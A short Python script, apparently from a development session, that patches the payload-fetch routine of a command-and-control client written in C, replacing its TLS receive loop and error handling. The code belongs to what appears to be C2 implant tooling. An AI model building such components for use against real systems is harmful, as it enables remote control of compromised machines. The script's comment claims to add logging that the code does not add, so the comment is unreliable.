import re
with open('/root/aegis10/c2_comms/c2_client.c', 'r') as f:
    data = f.read()

# Add log print for SSL connection result in payload fetch
new_code = '''
  if (sent < 0) {
    tls_disconnect(&conn);
    return AEGIS_ERR_NETWORK;
  }

  uint8_t *recv_buf = malloc(AEGIS_C2_MAX_PAYLOAD_SIZE);
  if (!recv_buf) {
    tls_disconnect(&conn);
    return AEGIS_ERR_ALLOC;
  }

  size_t recv_total = 0;
  ssize_t n;
  while ((n = tls_recv(&conn, recv_buf + recv_total,
                       AEGIS_C2_MAX_PAYLOAD_SIZE - recv_total)) > 0) {
    recv_total += (size_t)n;
  }
  tls_disconnect(&conn);

  if (recv_total == 0) {
      free(recv_buf);
      return AEGIS_ERR_NETWORK;
  }

  const uint8_t *body;
  size_t body_len;
'''

data = re.sub(r'  uint8_t \*recv_buf = malloc\(AEGIS_C2_MAX_PAYLOAD_SIZE\);.*?(?=  rc = parse_http_response\(recv_buf, recv_total, &body, &body_len\);)', new_code, data, flags=re.DOTALL)

with open('/root/aegis10/c2_comms/c2_client.c', 'w') as f:
    f.write(data)
